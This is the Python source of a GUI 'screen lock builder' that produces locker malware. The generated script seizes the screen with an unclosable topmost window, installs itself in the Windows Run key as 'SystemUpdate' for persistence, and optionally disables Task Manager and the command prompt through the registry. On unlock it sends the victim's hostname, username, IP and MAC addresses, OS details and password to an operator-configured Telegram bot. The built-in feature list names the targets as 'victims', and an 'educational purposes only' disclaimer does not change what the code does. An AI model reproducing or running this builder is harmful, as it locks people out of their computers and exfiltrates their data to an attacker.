import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import os
from datetime import datetime
import winreg
import subprocess
import platform
import socket
import uuid
import json

class ScreenLockBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("Screen lock builder v2.0")
        self.root.geometry("1000x700")
        self.root.configure(bg='#2b2b2b')
        self.root.resizable(False, False)
        
        # Variables
        self.filename_var = tk.StringVar(value="@Kazatematsu")
        self.password_var = tk.StringVar()
        self.lock_text_var = tk.StringVar()
        self.delayed_var = tk.BooleanVar()
        self.date_time_var = tk.StringVar()
        self.auto_startup_var = tk.BooleanVar()
        self.disable_taskmanager_var = tk.BooleanVar()
        self.block_cmd_var = tk.BooleanVar()
        
        # Telegram Configuration
        self.telegram_bot_token = tk.StringVar(value="YOUR_BOT_TOKEN")
        self.telegram_chat_id = tk.StringVar(value="YOUR_CHAT_ID")
        
        self.create_ui()
        
    def create_ui(self):
        # Create notebook for tabs
        style = ttk.Style()
        style.theme_use('default')
        style.configure('TNotebook', background='#2b2b2b', borderwidth=0)
        style.configure('TNotebook.Tab', background='#3c3c3c', foreground='white', 
                       padding=[20, 10], font=('Consolas', 11))
        style.map('TNotebook.Tab', background=[('selected', '#1a5f5f')])
        
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Settings Tab
        settings_frame = tk.Frame(notebook, bg='#2b2b2b')
        notebook.add(settings_frame, text='Settings')
        
        # Updates Tab
        updates_frame = tk.Frame(notebook, bg='#2b2b2b')
        notebook.add(updates_frame, text='Updates')
        
        self.create_settings_tab(settings_frame)
        self.create_updates_tab(updates_frame)
        
    def create_settings_tab(self, parent):
        # Main container
        main_container = tk.Frame(parent, bg='#2b2b2b')
        main_container.pack(fill='both', expand=True, padx=20, pady=20)
        
        # Left Panel
        left_panel = tk.Frame(main_container, bg='#3c3c3c', relief='solid', bd=1)
        left_panel.pack(side='left', fill='both', expand=True, padx=(0, 10))
        
        # Screen lock file name
        tk.Label(left_panel, text="Screen lock file name", 
                bg='#3c3c3c', fg='white', font=('Consolas', 12, 'bold')).pack(pady=(20, 10))
        
        filename_entry = tk.Entry(left_panel, textvariable=self.filename_var, 
                                 bg='#2b2b2b', fg='white', font=('Consolas', 11),
                                 insertbackground='white', relief='solid', bd=1)
        filename_entry.pack(padx=40, pady=10, ipady=8, fill='x')
        
        # Password
        tk.Label(left_panel, text="Password", 
                bg='#3c3c3c', fg='white', font=('Consolas', 12, 'bold')).pack(pady=(30, 10))
        
        password_entry = tk.Entry(left_panel, textvariable=self.password_var, 
                                 bg='#2b2b2b', fg='white', font=('Consolas', 11),
                                 insertbackground='white', relief='solid', bd=1, show='*')
        password_entry.pack(padx=40, pady=10, ipady=8, fill='x')
        
        set_pass_btn = tk.Button(left_panel, text="Set password", 
                                command=self.set_password,
                                bg='#5a7d8c', fg='white', font=('Consolas', 10, 'bold'),
                                relief='flat', cursor='hand2', padx=20, pady=8)
        set_pass_btn.pack(pady=10)
        
        # Lock screen text
        tk.Label(left_panel, text="Lock screen text", 
                bg='#3c3c3c', fg='white', font=('Consolas', 12, 'bold')).pack(pady=(30, 10))
        
        lock_text_entry = tk.Entry(left_panel, textvariable=self.lock_text_var, 
                                   bg='#2b2b2b', fg='white', font=('Consolas', 11),
                                   insertbackground='white', relief='solid', bd=1)
        lock_text_entry.pack(padx=40, pady=10, ipady=8, fill='x')
        
        set_text_btn = tk.Button(left_panel, text="Set screen text", 
                                command=self.set_screen_text,
                                bg='#5a7d8c', fg='white', font=('Consolas', 10, 'bold'),
                                relief='flat', cursor='hand2', padx=20, pady=8)
        set_text_btn.pack(pady=10)
        
        # Right Panel
        right_panel = tk.Frame(main_container, bg='#3c3c3c', relief='solid', bd=1)
        right_panel.pack(side='right', fill='both', expand=True)
        
        # Telegram Config Section
        tk.Label(right_panel, text="📱 Telegram Configuration", 
                bg='#3c3c3c', fg='#00ff00', font=('Consolas', 11, 'bold')).pack(pady=(20, 10))
        
        # Bot Token
        tk.Label(right_panel, text="Bot Token:", 
                bg='#3c3c3c', fg='white', font=('Consolas', 9)).pack(pady=(5, 2), padx=20, anchor='w')
        bot_token_entry = tk.Entry(right_panel, textvariable=self.telegram_bot_token,
                                   bg='#2b2b2b', fg='white', font=('Consolas', 9),
                                   insertbackground='white', relief='solid', bd=1)
        bot_token_entry.pack(padx=20, pady=5, ipady=5, fill='x')
        
        # Chat ID
        tk.Label(right_panel, text="Chat ID:", 
                bg='#3c3c3c', fg='white', font=('Consolas', 9)).pack(pady=(10, 2), padx=20, anchor='w')
        chat_id_entry = tk.Entry(right_panel, textvariable=self.telegram_chat_id,
                                bg='#2b2b2b', fg='white', font=('Consolas', 9),
                                insertbackground='white', relief='solid', bd=1)
        chat_id_entry.pack(padx=20, pady=5, ipady=5, fill='x')
        
        # Separator
        tk.Frame(right_panel, bg='#666', height=1).pack(fill='x', padx=20, pady=15)
        
        # Delayed lock screen close
        delayed_check = tk.Checkbutton(right_panel, variable=self.delayed_var,
                                      bg='#3c3c3c', fg='white', 
                                      selectcolor='#2b2b2b', font=('Consolas', 10),
                                      text="Delayed lock screen close", cursor='hand2')
        delayed_check.pack(pady=(10, 5), padx=20, anchor='w')
        
        # Date and time input
        datetime_entry = tk.Entry(right_panel, textvariable=self.date_time_var,
                                 bg='#2b2b2b', fg='#666', font=('Consolas', 10),
                                 insertbackground='white', relief='solid', bd=1)
        datetime_entry.pack(padx=40, pady=5, ipady=6, fill='x')
        self.date_time_var.set("Date and time here!")
        
        tk.Label(right_panel, text="Example: 03.10.2025 14:16", 
                bg='#3c3c3c', fg='#999', font=('Consolas', 8)).pack(pady=3)
        
        # Auto-startup
        auto_check = tk.Checkbutton(right_panel, variable=self.auto_startup_var,
                                    bg='#3c3c3c', fg='white', 
                                    selectcolor='#2b2b2b', font=('Consolas', 10),
                                    text="Auto-startup", cursor='hand2')
        auto_check.pack(pady=(15, 5), padx=20, anchor='w')
        
        # Disable taskmanager
        taskman_check = tk.Checkbutton(right_panel, variable=self.disable_taskmanager_var,
                                      bg='#3c3c3c', fg='white', 
                                      selectcolor='#2b2b2b', font=('Consolas', 10),
                                      text="Disable taskmanager", cursor='hand2')
        taskman_check.pack(pady=5, padx=20, anchor='w')
        
        # Block cmd
        cmd_check = tk.Checkbutton(right_panel, variable=self.block_cmd_var,
                                   bg='#3c3c3c', fg='white', 
                                   selectcolor='#2b2b2b', font=('Consolas', 10),
                                   text="Block cmd", cursor='hand2')
        cmd_check.pack(pady=5, padx=20, anchor='w')
        
        # Build button
        build_btn = tk.Button(self.root, text="Build", 
                              command=self.build_lock_file,
                              bg='#28a745', fg='white', font=('Consolas', 14, 'bold'),
                              relief='flat', cursor='hand2', padx=60, pady=15)
        build_btn.pack(pady=15)
        
    def create_updates_tab(self, parent):
        # Updates info container
        info_frame = tk.Frame(parent, bg='#2b2b2b')
        info_frame.pack(fill='both', expand=True, padx=20, pady=20)
        
        # Owner info
        owner_frame = tk.Frame(info_frame, bg='#3c3c3c', relief='solid', bd=1)
        owner_frame.pack(fill='x', pady=(0, 20))
        
        tk.Label(owner_frame, text="🎯 Tool Information", 
                bg='#3c3c3c', fg='#00ff00', font=('Consolas', 14, 'bold')).pack(pady=15)
        
        tk.Label(owner_frame, text="Owner tool: @Kazatematsu", 
                bg='#3c3c3c', fg='white', font=('Consolas', 12)).pack(pady=5)
        
        tk.Label(owner_frame, text="Version: 2.0", 
                bg='#3c3c3c', fg='#999', font=('Consolas', 10)).pack(pady=5)
        
        tk.Label(owner_frame, text="Last Update: " + datetime.now().strftime('%d.%m.%Y'), 
                bg='#3c3c3c', fg='#999', font=('Consolas', 10)).pack(pady=(5, 15))
        
        # Features section
        features_frame = tk.Frame(info_frame, bg='#3c3c3c', relief='solid', bd=1)
        features_frame.pack(fill='both', expand=True)
        
        tk.Label(features_frame, text="📋 Features", 
                bg='#3c3c3c', fg='#00ff00', font=('Consolas', 14, 'bold')).pack(pady=15)
        
        features_text = scrolledtext.ScrolledText(features_frame, 
                                                 bg='#2b2b2b', fg='white',
                                                 font=('Consolas', 10), 
                                                 relief='flat', height=15)
        features_text.pack(padx=20, pady=10, fill='both', expand=True)
        
        features = """
✅ Create custom screen lock files
✅ Password protection
✅ Custom lock screen text
✅ Delayed activation with date/time
✅ Auto-startup on Windows boot
✅ Disable Task Manager
✅ Block Command Prompt
✅ Send client info via Telegram:
   • Computer name
   • Username
   • IP address (Local & Public)
   • MAC address
   • OS information
   • Hardware info
   • Unlock password used
   
📱 TELEGRAM INTEGRATION:
Configure your Bot Token and Chat ID in Settings tab.
All victim info will be sent directly to your Telegram.

⚠️ DISCLAIMER:
This tool is for educational purposes only.
Owner is not responsible for misuse.

🔐 Security Features:
- Cannot be closed with Alt+F4
- Fullscreen lock
- Topmost window priority
- Registry modifications for persistence
- Modern UI with gradient background

📡 Auto Info Sending:
When victim unlocks the screen, all system
information and password will be sent to
your Telegram automatically.

Contact: t.me/Kazatematsu
        """
        
        features_text.insert('1.0', features)
        features_text.config(state='disabled')
        
    def set_password(self):
        password = self.password_var.get()
        if password:
            messagebox.showinfo("Success", "Password set: " + password)
        else:
            messagebox.showwarning("Warning", "Please enter a password!")
            
    def set_screen_text(self):
        text = self.lock_text_var.get()
        if text:
            messagebox.showinfo("Success", "Screen text set: " + text)
        else:
            messagebox.showwarning("Warning", "Please enter lock screen text!")
            
    def build_lock_file(self):
        filename = self.filename_var.get()
        password = self.password_var.get()
        lock_text = self.lock_text_var.get()
        bot_token = self.telegram_bot_token.get()
        chat_id = self.telegram_chat_id.get()
        
        if not password:
            messagebox.showerror("Error", "Password is required!")
            return
            
        if bot_token == "YOUR_BOT_TOKEN" or chat_id == "YOUR_CHAT_ID":
            response = messagebox.askyesno("Warning", 
                                          "Telegram config not set!\n\n"
                                          "Continue without Telegram integration?")
            if not response:
                return
            
        # Generate Python script for screen lock
        script_content = self.generate_lock_script(password, lock_text, bot_token, chat_id)
        
        # Save the script
        output_file = filename + ".py"
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(script_content)
                
            msg = "✅ Screen lock file built successfully!\n\n"
            msg += "File: " + output_file + "\n"
            msg += "Password: " + password + "\n\n"
            msg += "Settings Applied:\n"
            msg += "• Telegram: " + ('Configured' if bot_token != 'YOUR_BOT_TOKEN' else 'Not configured') + "\n"
            msg += "• Auto-startup: " + str(self.auto_startup_var.get()) + "\n"
            msg += "• Task Manager: " + ('Disabled' if self.disable_taskmanager_var.get() else 'Enabled') + "\n"
            msg += "• CMD: " + ('Blocked' if self.block_cmd_var.get() else 'Allowed') + "\n\n"
            msg += "⚠️ Client info will be sent when unlocked!"
            
            messagebox.showinfo("Success", msg)
        except Exception as e:
            messagebox.showerror("Error", "Failed to build file: " + str(e))
            
    def generate_lock_script(self, password, lock_text, bot_token, chat_id):
        delayed_code = ""
        if self.delayed_var.get() and self.date_time_var.get() != "Date and time here!":
            delayed_code = '''
import datetime
target_time = datetime.datetime.strptime("''' + self.date_time_var.get() + '''", "%d.%m.%Y %H:%M")
while datetime.datetime.now() < target_time:
    time.sleep(60)
'''

        registry_code = ""
        if self.auto_startup_var.get():
            registry_code += '''
# Add to startup
try:
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
    winreg.CloseKey(key)
except: pass
'''

        if self.disable_taskmanager_var.get():
            registry_code += '''
# Disable Task Manager
try:
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                          r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)
except: pass
'''

        if self.block_cmd_var.get():
            registry_code += '''
# Block CMD
try:
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                          r"Software\\Policies\\Microsoft\\Windows\\System")
    winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)
except: pass
'''
        
        script = '''import tkinter as tk
from tkinter import messagebox
import sys
import time
import platform
import socket
import uuid
import requests
import json
from datetime import datetime
import os
''' + delayed_code + '''

TELEGRAM_BOT_TOKEN = "''' + bot_token + '''"
TELEGRAM_CHAT_ID = "''' + chat_id + '''"

def get_public_ip():
    """Get public IP address"""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json()['ip']
    except:
        return "Unknown"

def get_system_info():
    """Collect client system information"""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        public_ip = get_public_ip()
        mac = uuid.getnode()
        mac_list = []
        for i in range(0, 8*6, 8):
            mac_list.append(format((mac >> i) & 0xff, '02x'))
        mac_address = ':'.join(mac_list[::-1])
        
        info = {
            "computer_name": hostname,
            "username": os.getlogin() if hasattr(os, 'getlogin') else "Unknown",
            "local_ip": local_ip,
            "public_ip": public_ip,
            "mac_address": mac_address,
            "os": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "processor": platform.processor(),
            "machine": platform.machine(),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        return info
    except Exception as e:
        return {"error": str(e)}

def send_to_telegram(password_used):
    """Send client info and password to Telegram"""
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN":
        return
        
    try:
        system_info = get_system_info()
        
        message = "\\n🔓 **SYSTEM UNLOCKED**\\n\\n"
        message += "🔑 **Password:** `" + password_used + "`\\n\\n"
        message += "💻 **Computer Info:**\\n"
        message += "• Name: " + system_info.get('computer_name', 'Unknown') + "\\n"
        message += "• Username: " + system_info.get('username', 'Unknown') + "\\n"
        message += "• OS: " + system_info.get('os', 'Unknown') + " " + system_info.get('os_release', '') + "\\n"
        message += "• Processor: " + system_info.get('processor', 'Unknown') + "\\n\\n"
        message += "🌐 **Network Info:**\\n"
        message += "• Local IP: " + system_info.get('local_ip', 'Unknown') + "\\n"
        message += "• Public IP: " + system_info.get('public_ip', 'Unknown') + "\\n"
        message += "• MAC: " + system_info.get('mac_address', 'Unknown') + "\\n\\n"
        message += "⏰ **Time:** " + system_info.get('timestamp', 'Unknown') + "\\n\\n"
        message += "👤 Owner: @Kazatematsu"
        
        url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        pass

''' + registry_code + '''

class ScreenLock:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("System Locked")
        
        # Force fullscreen
        self.root.overrideredirect(True)
        self.root.attributes('-topmost', True)
        
        # Get screen dimensions
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        self.root.geometry(str(screen_width) + "x" + str(screen_height) + "+0+0")
        
        # Disable all keyboard shortcuts
        self.root.bind('<Control-c>', lambda e: 'break')
        self.root.bind('<Control-x>', lambda e: 'break')
        self.root.bind('<Control-v>', lambda e: 'break')
        self.root.bind('<Alt-F4>', lambda e: 'break')
        self.root.bind('<Escape>', lambda e: 'break')
        
        # Create gradient background canvas
        self.canvas = tk.Canvas(self.root, highlightthickness=0, width=screen_width, height=screen_height)
        self.canvas.pack(fill='both', expand=True)
        
        # Disable close button
        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        
        # Keep window on top forever
        self.keep_on_top()
        
        # Create gradient effect
        for i in range(screen_height):
            color_value = int(20 + (i / screen_height) * 30)
            hex_val = format(color_value, '02x')
            color = '#' + hex_val + hex_val + hex_val
            self.canvas.create_line(0, i, screen_width, i, fill=color)
        
        # Create lock UI frame
        lock_frame = tk.Frame(self.canvas, bg='#2d2d2d', bd=2, relief='solid')
        lock_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        # Lock icon and title
        icon_label = tk.Label(lock_frame, text="🔒", bg='#2d2d2d', 
                             font=('Arial', 60))
        icon_label.pack(pady=(30, 10))
        
        title_label = tk.Label(lock_frame, text="SYSTEM LOCKED", 
                              bg='#2d2d2d', fg='#4a90e2',
                              font=('Arial', 24, 'bold'))
        title_label.pack(pady=10)
        
        # Custom text or default link
        link_text = "''' + (lock_text if lock_text else 't.me/Kazatematsu') + '''"
        link_label = tk.Label(lock_frame, text=link_text,
                             bg='#2d2d2d', fg='#888',
                             font=('Consolas', 11))
        link_label.pack(pady=10)
        
        # Password entry
        self.password_entry = tk.Entry(lock_frame, show='', 
                                      font=('Arial', 13), width=30,
                                      bg='#3a3a3a', fg='white',
                                      insertbackground='white',
                                      relief='solid', bd=1)
        self.password_entry.pack(pady=20, padx=40, ipady=8)
        self.password_entry.focus()
        
        # Unlock button
        unlock_btn = tk.Button(lock_frame, text="UNLOCK",
                              command=self.check_password,
                              font=('Arial', 12, 'bold'),
                              bg='#4a90e2', fg='white',
                              relief='flat', cursor='hand2',
                              padx=40, pady=10)
        unlock_btn.pack(pady=(10, 30))
        
        # Incorrect attempts label
        self.attempts_label = tk.Label(lock_frame, text="",
                                      bg='#2d2d2d', fg='#ff4444',
                                      font=('Consolas', 9))
        self.attempts_label.pack(pady=(0, 20))
        
        # Bind Enter key
        self.password_entry.bind('<Return>', lambda e: self.check_password())
        
        self.attempts = 0
        
        self.root.mainloop()
    
    def do_nothing(self):
        """Prevent window from closing"""
        pass
    
    def keep_on_top(self):
        """Keep window always on top"""
        self.root.lift()
        self.root.attributes('-topmost', True)
        self.root.after(100, self.keep_on_top)
        
    def check_password(self):
        entered_password = self.password_entry.get()
        if entered_password == "''' + password + '''":
            # Send info to Telegram before unlocking
            send_to_telegram(entered_password)
            time.sleep(0.5)
            self.root.quit()
            self.root.destroy()
        else:
            self.attempts += 1
            self.attempts_label.config(text="Incorrect password!")
            self.password_entry.delete(0, tk.END)

if __name__ == "__main__":
    try:
        ScreenLock()
    except Exception as e:
        pass
'''
        
        return script

if __name__ == "__main__":
    root = tk.Tk()
    app = ScreenLockBuilder(root)
    root.mainloop()
